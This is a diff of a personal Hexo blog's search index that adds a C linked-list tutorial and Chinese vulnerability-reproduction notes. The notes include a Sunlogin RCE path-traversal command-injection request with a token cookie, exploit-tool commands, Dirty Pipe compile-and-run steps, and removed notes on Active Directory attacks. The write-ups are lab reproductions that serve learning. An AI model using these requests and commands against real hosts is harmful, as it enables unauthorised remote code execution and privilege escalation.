5a5433dd9cf2741bf2af8f2ccc193974f07b08a26654f3f4ae83bbd05f549183f9e861d56cb2388b353a35338ef5ff27acd444b18707a63047f94990cafe9d1c074f3e39fd4a801c3fbf22af821202af2d8d8e9d1832ee0bca257e38b574a5dd786220b4d05b47def8827c013a9d2d9feadac184cd5ff061e282e9bad3ec2f9fee25d23754a23aa0bc95ae6fd885777eeb8afb6df415e4235d6cf10dde4ccb2094cbfa4dd38087a36bbd5ca0c03387b4f08aea0ccdf9b0e6525f53c70de5a8d07989fdd083ef500a20564254c835fc32b80119cd1cdeb1ba17c87e719f219adf439286591f83ba7d06b5496900f10d17e94a57c3f46b7dd617e81a71eb5f41e5b5125772158d5fd1f4c4a90237aa343c203e19f32100e01994400f899abf54b3f020a5fc6f436ee503965b708cf3931dd1a76525f22a2775304d317ef022b457f9305997f8c78bc3cadf2024f067492113669798c60dbbde9ef5de588401fcef52bd4cf33e95bcc2c642bf45416f26b0c04ab90625472047e78672fee3c8a7bff2ca9897aabea89651fdb3e07a26ac89372885e1c87e2b1d4a30b198a7c2bd587cc3ee063b499cdeaa2efa47412213dd288bd776262363d8802db2108d8397df176d590dc449ea433a6d2790d854aedf0ca9e41d17c5f4a786bc9c93ddb96bbb1a2de0ad944ccf70b099bf02abadbf84e071f5418ccf2f7f25907e839eb3dbd5eb6cdb334f9e25f43bf4bc5974dd2974d3da11bd9b9c4917e579bf74380d19384bcca7b56abebd1c6808eb9c879920c462713bf73d9920944678da1c68332e009101c21cf4addf52e0cc873d88f86e4c6715b0c42d2d61c82500a6db101ab83f3640dab660bc8ef770fbca19b02758607e402d9f96c16910beb0a700279d4c385740caa3ebb39ec7cc248d2e6189c92575dc85ac658a81b45c4116500379fc91faf7bc08940d8b729864af184cfb08c0c6999b24d8a58290b4ce431acdb2a35b91153ab52408759c2b1b0726ebbedf2b293d90187bcecf4d9a3c477a7ab92fa622109ae064ad834b2a03b40c941e2bbdf859b79077c7aa654ecdc01e8153cd12fc617c04fb70a0eb2066ae937e2b57f4dc04e0ab298d37c88761fbc7350e14fe10f2aada11410211a7087955178465090f641683ea17884377427547665268357b390290d5524c0408cc24f5921c16cd6f6137f14304ea9380b66488dd2f806a3d2c54bffb6a29c9a3ca2360313219da1ffbdaee5de55e30678526e1383855cc6fc192e2a61f3b14bbfee4176cf90ada541676d5ab537b998eec2449feb0005a4c1a310746a76cae02eb28c41417c71d773010a929338efd6696816053062f6b999b4c50ead027ebbf7ef1e6a71b8abc855271f2c8e9077907c5e39a5068f4b697e073b0c1d0c727c6b616aac8034b1078ab78b4d032f22e59d4267c025ad5e7215e11a5f9909aed466b8b58d026f9a24be85668931f99537779044274828e0db16e229aa9f16a21bed219903e0b404b6368da9a5462bf8ba98dd4298fb8989bab9a51c0cc012964eaba6ad080c3b4c1b2f666261555cd073f7c88df3553c26a64cf273486923b6d5736b9744797c3ebe9c282875f6c3deb569684a9866439c1ba1f9b5c4e28fa81108246cadbc4fa25c90623e7c611caa166ccf06a6e8aeb8989a7a38961fcfe008413c785569010cd0976ce52710e22ba1423d8ca254d65321086b86f6415eaa0a98c3bc1a0f8e596223ff62a193541bc48cf5259cc15267f6bf704e00e0c06f81efa4ad1ad2a3e6e3a86f183fc798e0d69b20a9b51572cdce30d6fc546183e823a78f265ccf67b7dab53640fe28fef165f0c5f00bb9a55aee92d43941da5b4276cae27c210f54c7c04d86c989e3ad034774e4f92628384e99f7e5f6237bc6416f4cfc63e58668cc14f9440cd3db8a2dfcbd5a572cfc4f32d724640f3beaeb8043f28a5bae0b3c184995e032955eb3b70d1a7a54530467ae0e424be7fb724432ffaa2fe74095132bcb591952d1c5dfed4c6364facd3260da73f6f1f4195bb01d757553bdab14a3a2b1fdf369427e2288e3cac9e853d8856504cbd7092801fbfca57686bcc9f57717f871b07f6183a25b1ba9c97d807dc5c9ce3ec31832c8090424f4e78a3d67e69d89e70886d52d9480e0b3a83b8ad53d572ffd1a8099ac5834851da7b10c0bc7a0a4e7c29104b4cd352c85a76047aee59dc4189b9f2059472c84c4b14dc49074bbe0151a351c7d768ef4511fa9136335a1172429391aba5cae8b1135a26a95a608d59792fff5f09ed578daa9a5e8fba0bf12ceedc7bde0c81d37488ed3af0f2801dd507e52970d688ba0e40703ed64faa243f71b10f20b81df2ffbcfd7a06318d1ee87f77e2d1ec1dcff3661d51b06a581e02d429e5ee2ee43ac1effa2d485293759c4b0e2478188198110c0679454936696f9b842327d90c63787fc73d405a9e22b0e26767f5eb4c40208d0f259d1b43ad790a66484c37c26c71b2335ae6a35d6ed8afa90000a7277461729c4f8d39a4d81d400b79e491ac4f01bc94fcd966508dc53e6131500c905afa0d76e6369c2f63c9361db8610957a703554228ce13262ed6573010235d3a2501dec31741bf0f3be50ed49525362c7ff51457cc976958b604beaa777859f67a1796a71afa8f00aaf00c07e88f2e2f184128e29aec344119618b1f79f4574424a5b767ef7d9438858d03e443ae5955e8dbb3328eedd7842b52a48c570ddb5e4ac910454f8abe8165984cc96224e68d817f67ecbb896fb29dbff9fc5e06d7b5aa0a881e05ab2f315413a7a085e65cab0c322f3e71743eb2416c21667791bd6c495e2691218a6c86a7a9f6cc167774c960c7e971ee47fc09fbed9761115ff8eaaa42d0e206a5c9c3f78c11f1198502898724144a3b586d8383d3d5e9b6367f20a5768fd55fb6bd3cf02e203e2de2c0e3d4bd98a250c363017716f79f5662b8c004d33c4a7c61da6303291bfb9978c702653212a80ee4bf7528c981595a5092c17d8e449235dde47136f341889b6a53ffadd510bb24f027c9e731f29395b3a8b2b501a58354aa86e52da009e6f089b66ebf32fbc1269d65e101396195c4636b84176900251b125ee9927f9270</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码是我的qq</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+    <title>链表-c语言</title>
+    <url>/2020/09/16/2020.9.16%E9%93%BE%E8%A1%A8/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://shmily-ing.github.io/">Shmily-ing’blog</a>! </p>
+<p>下面主要是运用C去实现链表的头插法，尾插法实现有序插入，以及中间插入一个数。</p>
+<span id="more"></span>
+
+<h2 id="头插法"><a href="#头插法" class="headerlink" title="头插法"></a>头插法</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span><span class="comment">// 头插法</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* run this program using the console pauser or add your own getch, system(&quot;pause&quot;) or input loop */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> data ;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">	</span><br><span class="line">&#125;<span class="built_in">list</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> *head,*s;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">list</span> *p;</span><br><span class="line">	head=<span class="literal">NULL</span>;</span><br><span class="line">	</span><br><span class="line">	input();</span><br><span class="line">	<span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123; <span class="comment">//输出头插法链表数据</span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot; %d &quot;</span>,p-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	</span><br><span class="line">	head = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">	<span class="keyword">while</span>(i!=<span class="number">100</span>)&#123;</span><br><span class="line">		</span><br><span class="line">		s=(<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">		s-&gt;data=i;</span><br><span class="line">		s-&gt;next = head;  <span class="comment">//第一个数据地址为空，下一个指向前一个s；</span></span><br><span class="line">		head = s;          <span class="comment">//作为新头部；</span></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="尾插法的有序插入"><a href="#尾插法的有序插入" class="headerlink" title="尾插法的有序插入"></a>尾插法的有序插入</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">         <span class="keyword">char</span> data;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;linklist;</span><br><span class="line">  linklist *head,*tail;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   linklist *p;</span><br><span class="line">   head=tail=<span class="literal">NULL</span>;</span><br><span class="line">   input();</span><br><span class="line">   <span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>,p-&gt;data);</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">char</span> ch;</span><br><span class="line">   linklist *t;</span><br><span class="line">   ch=getchar();</span><br><span class="line">   <span class="keyword">while</span>(ch!=&amp;apos;@&amp;apos;)&#123;</span><br><span class="line">       t=(linklist *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linklist));</span><br><span class="line">       t-&gt;data=ch;</span><br><span class="line">       <span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;</span><br><span class="line">       head=t;</span><br><span class="line">       t-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">       tail-&gt;next=t;</span><br><span class="line">&#125;</span><br><span class="line">   tail=t;</span><br><span class="line">   tail-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">   t=(linklist *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linklist));</span><br><span class="line">   ch=getchar();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="插入有序链表一个数"><a href="#插入有序链表一个数" class="headerlink" title="插入有序链表一个数"></a>插入有序链表一个数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>     <span class="comment">//实现简单的有序链表插入 </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* run this program using the console pauser or add your own getch, system(&quot;pause&quot;) or input loop */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> data ;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">	</span><br><span class="line">&#125;<span class="built_in">list</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> *head,*tail;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input_inset</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">list</span> *p; </span><br><span class="line">	head=tail=<span class="literal">NULL</span>;</span><br><span class="line">	input_inset();</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123;     </span><br><span class="line">	</span><br><span class="line">	          <span class="built_in">printf</span>(<span class="string">&quot; %d &quot;</span>,p-&gt;data);         </span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input_inset</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,num;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">list</span> *t,*T,*pp;</span><br><span class="line">	t = (<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">	<span class="keyword">while</span>(i!=<span class="number">100</span>)&#123;</span><br><span class="line">		</span><br><span class="line">		t-&gt;data = i;</span><br><span class="line">		<span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;  </span><br><span class="line">	</span><br><span class="line">		    head = t;     </span><br><span class="line">		    t-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> tail-&gt;next=t;</span><br><span class="line">	</span><br><span class="line">	tail = t;   </span><br><span class="line">	</span><br><span class="line">	tail-&gt;next=<span class="literal">NULL</span>;  </span><br><span class="line">	</span><br><span class="line">	t = (<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">	</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//插入操作 </span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入插入点的前一个数字:\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(pp=head;pp!=<span class="literal">NULL</span>;pp= pp-&gt;next)&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(pp-&gt;data==num)&#123;</span><br><span class="line">			</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;请输入要插入的数字:\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">			T = (<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">	</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;T-&gt;data);</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">			T-&gt;next=pp-&gt;next;</span><br><span class="line">			</span><br><span class="line">			pp-&gt;next = T;</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;输出插入后的链表\n&quot;</span>);	</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>多谢刘**的指导（内心抗拒）</p>
+<p>可能写的不是很完美，感谢大佬的访问~~ORZ</p>
+]]></content>
       <categories>
-        <category>经历</category>
+        <category>C语言</category>
       </categories>
       <tags>
-        <tag>对2020年总结</tag>
+        <tag>算法与数据结构</tag>
       </tags>
   </entry>
   <entry>
@@ -245,68 +323,6 @@
       </tags>
   </entry>
   <entry>
-    <title>AD域的攻击方式</title>
-    <url>/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</url>
-    <content><![CDATA[<h3 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h3><h3 id="本地组策略-LGP"><a href="#本地组策略-LGP" class="headerlink" title="本地组策略 LGP"></a>本地组策略 LGP</h3><p>简称（Local Group Policy或者Local GPO）</p>
-<p>win+R键打开运行，输入“gpedit.msc”</p>
-<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220303233218371.png" alt="image-20220303233218371"></p>
-<p>添加对应脚本即可</p>
-<p>或者将文件直接放入C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup   路径下  （可以开机自启）</p>
-<p>通常用来权限维持</p>
-<span id="more"></span>
-
-<h3 id="域组策略"><a href="#域组策略" class="headerlink" title="域组策略"></a>域组策略</h3><p>域控机器下发一些策略，可以利用域组策略进行批量修改</p>
-<h5 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a>SYSVOL</h5><p>SYSVOL是存储域公共文件服务器副本的共享的文件夹，存在域控制器(DC)的C:\Windows\SYSVOL下，用来为整个域中域控制器提供访问和复制的能力，里面保存了组策略相关的信息。     同时存放在Sysvol文件夹中的信息会复制到域中所有DC上。   在域中，用户登录时会先在sysvol下查找<strong>GPO</strong></p>
-<p>目录</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Domain 文件夹：存储策略实体，策略和脚本存储位置</span><br><span class="line">Staging：交换区域，临时存放多台DC之间需要同步的数据，DC中的数据首先复制该文件夹，然后在DC之间相互复制</span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="netlogon"><a href="#netlogon" class="headerlink" title="netlogon"></a>netlogon</h5><p><strong>netlogon</strong> 挂载点为 <code>SYSVOL\domain\SCRIPTS</code> ，存放脚本信息。</p>
-<h5 id="GPO（Group-Policy-Object）"><a href="#GPO（Group-Policy-Object）" class="headerlink" title="GPO（Group Policy Object）"></a>GPO（Group Policy Object）</h5><p>组策略设置的集合，用GPO来存储不同的组策略信息。</p>
-<h3 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h3><p>即  组策略首选项（Group Policy Preference，GPP）借助了GPO实现域中所有资源的管理</p>
-<p>Gpp 用来在下面场景存储和使用凭据</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">映射驱动（Drives.xml）</span><br><span class="line">创建本地用户</span><br><span class="line">数据源（DataSources.xml）</span><br><span class="line">打印机配置（Printers.xml）</span><br><span class="line">创建&#x2F;更新服务（Services.xml）</span><br><span class="line">计划任务（ScheduledTasks.xml）</span><br><span class="line">更改本地Administrator密码</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<p>参考：<a href="https://xz.aliyun.com/t/9511">https://xz.aliyun.com/t/9511</a></p>
-<h1 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h1><h1 id="打印机漏洞"><a href="#打印机漏洞" class="headerlink" title="打印机漏洞"></a>打印机漏洞</h1><h1 id="打域控"><a href="#打域控" class="headerlink" title="打域控"></a>打域控</h1><ul>
-<li>ZeroLogon(CVE-2020-1472)</li>
-<li>（CVE-2021-42287 and CVE-2021-42278）只需一个域用户</li>
-</ul>
-<h1 id="Dcsync"><a href="#Dcsync" class="headerlink" title="Dcsync"></a>Dcsync</h1><p>利用域管理员导出域内所有用户hash</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>内网</category>
-      </categories>
-      <tags>
-        <tag>AD域的攻击方式</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Access注入</title>
     <url>/2021/01/10/Access%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[]]></content>
@@ -320,26 +336,99 @@
   <entry>
     <title>CVE复现</title>
     <url>/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h2 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h2><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h4 id="CVE-2022-0847Linux-本地内核提权漏洞"><a href="#CVE-2022-0847Linux-本地内核提权漏洞" class="headerlink" title="CVE-2022-0847Linux 本地内核提权漏洞"></a>CVE-2022-0847Linux 本地内核提权漏洞</h4><p>exp 链接：<a href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit">https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit</a></p>
-<p>适用范围：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Linux Kernel版本 &gt;&#x3D; 5.8</span><br><span class="line"></span><br><span class="line">Linux Kernel版本 &lt; 5.16.11 &#x2F; 5.15.25 &#x2F; 5.10.102 </span><br></pre></td></tr></table></figure>
+    <content><![CDATA[<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="向日葵远程代码执行"><a href="#向日葵远程代码执行" class="headerlink" title="向日葵远程代码执行"></a>向日葵远程代码执行</h3><h5 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h5><p><strong>向日葵远程控制</strong>是一款免费的集远程控制电脑手机、远程桌面连接、远程开机、远程管理、支持内网穿透的一体化远程控制管理工具软件。</p>
+<p>（CNVD-2022-10270/CNVD-2022-03672），影响Windows系统使用的个人版和简约版。 该漏洞发生在接口``/check`处，</p>
+<p>此漏洞端口一般大于40000</p>
+<span id="more"></span>
+
+<h5 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">11.1.1</span><br><span class="line"></span><br><span class="line">10.3.0.27372</span><br><span class="line"></span><br><span class="line">11.0.0.33162      （不一定准确）</span><br></pre></td></tr></table></figure>
 
 
 
+<h5 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h5><blockquote>
+<p>手工测试：</p>
+</blockquote>
+<p>首先我们要确定目标端口(扫描开放端口，一般在 40000以上)，然后访问</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.102:49414&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/image-20220320225345974.png" alt="image-20220320225345974"></p>
+<p>获取token</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.102:49414&#x2F;cgi-bin&#x2F;rpc?action&#x3D;verify-haras</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/image-20220320225428763.png" alt="image-20220320225428763"></p>
+<p>“verify_string” 的值会刷新改变，但这个下面我们和CID:组成cookie</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;check?cmd&#x3D;ping..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;ipconfig</span><br><span class="line"></span><br><span class="line">添加  Cookie: CID&#x3D;sobGzXzWBfSlSbdqnmkUbJMLEjhssRx1</span><br></pre></td></tr></table></figure>
 
 
 
+<p><img src="/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/image-20220320230404045.png" alt="image-20220320230404045"></p>
+<blockquote>
+<p>脚本测试：</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Mr-xn&#x2F;sunlogin_rce</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;version    #查看linux内核版本</span><br><span class="line"></span><br><span class="line">.&#x2F;compile.sh</span><br><span class="line"></span><br><span class="line">.&#x2F;exploit</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xrkRce.exe -h 192.168.1.102 -t scan</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/image-20220320224603734.png" alt="image-20220320224603734"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xrkRce.exe -h 192.168.1.102 -t rce -p 49414 -c &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/image-20220320225054179.png" alt="image-20220320225054179"></p>
+<p>参考：</p>
+<p><a href="https://www.cnblogs.com/cn-gov/p/15952459.html">https://www.cnblogs.com/cn-gov/p/15952459.html</a></p>
+<h3 id="CVE-2022-0543-Redis-Lua-沙箱绕过"><a href="#CVE-2022-0543-Redis-Lua-沙箱绕过" class="headerlink" title="CVE-2022-0543   Redis Lua 沙箱绕过"></a>CVE-2022-0543   Redis Lua 沙箱绕过</h3><p>参考：</p>
+<p><a href="https://mp.weixin.qq.com/s/Q3iRoVynpkUHUDo74UnXgA">https://mp.weixin.qq.com/s/Q3iRoVynpkUHUDo74UnXgA</a></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="CVE-2022-0847-Linux-本地内核提权漏洞"><a href="#CVE-2022-0847-Linux-本地内核提权漏洞" class="headerlink" title="CVE-2022-0847 Linux 本地内核提权漏洞"></a>CVE-2022-0847 Linux 本地内核提权漏洞</h3><h5 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h5><p>堪称新版脏牛。Dirty Pipe</p>
+<p>允许非特权用户注入和覆盖任意只读文件中的数据，导致权限提升，并最终获得root权限。</p>
+<p>exp 链接：<a href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit">https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit</a></p>
+<h5 id="适用范围："><a href="#适用范围：" class="headerlink" title="适用范围："></a>适用范围：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Linux Kernel版本 &gt;&#x3D; 5.8</span><br><span class="line"></span><br><span class="line">Linux Kernel版本 &lt; 5.16.11 &#x2F; 5.15.25 &#x2F; 5.10.102 </span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;version    #查看linux内核版本</span><br><span class="line"></span><br><span class="line">.&#x2F;compile.sh</span><br><span class="line"></span><br><span class="line">.&#x2F;exploit</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/image-20220310212912716.png" alt="image-20220310212912716"></p>
 <p>原理：<a href="https://mp.weixin.qq.com/s/cHuO8TO4IvGgslvipJGQ2A">漏洞通告：CVE-2022-0847linux内核提权漏洞复现/原理讲解 (qq.com)</a></p>
+<p><a href="https://www.freebuf.com/company-information/324470.html">https://www.freebuf.com/company-information/324470.html</a></p>
+<p><a href="https://zone.huoxian.cn/d/978-cve-2022-0847-dirtypipe-linux">CVE-2022-0847_DirtyPipe Linux 内核提权漏洞分析及复现 - 火线 Zone-云安全社区 (huoxian.cn)</a></p>
+<h3 id="CVE-2020-1337"><a href="#CVE-2020-1337" class="headerlink" title="CVE-2020-1337"></a>CVE-2020-1337</h3><h3 id="CVE-2020–1030"><a href="#CVE-2020–1030" class="headerlink" title="CVE-2020–1030"></a>CVE-2020–1030</h3><h3 id="CVE-2020–1048"><a href="#CVE-2020–1048" class="headerlink" title="CVE-2020–1048"></a>CVE-2020–1048</h3><h3 id="CVE-2022-21999-打印机提权漏洞"><a href="#CVE-2022-21999-打印机提权漏洞" class="headerlink" title="CVE-2022-21999  打印机提权漏洞"></a>CVE-2022-21999  打印机提权漏洞</h3><p>参考：</p>
+<p>原理：<a href="https://research.ifcr.dk/spoolfool-windows-print-spooler-privilege-escalation-cve-2022-22718-bf7752b68d81">https://research.ifcr.dk/spoolfool-windows-print-spooler-privilege-escalation-cve-2022-22718-bf7752b68d81</a></p>
+<p>poc：<a href="https://github.com/ly4k/SpoolFool">https://github.com/ly4k/SpoolFool</a></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
       </categories>
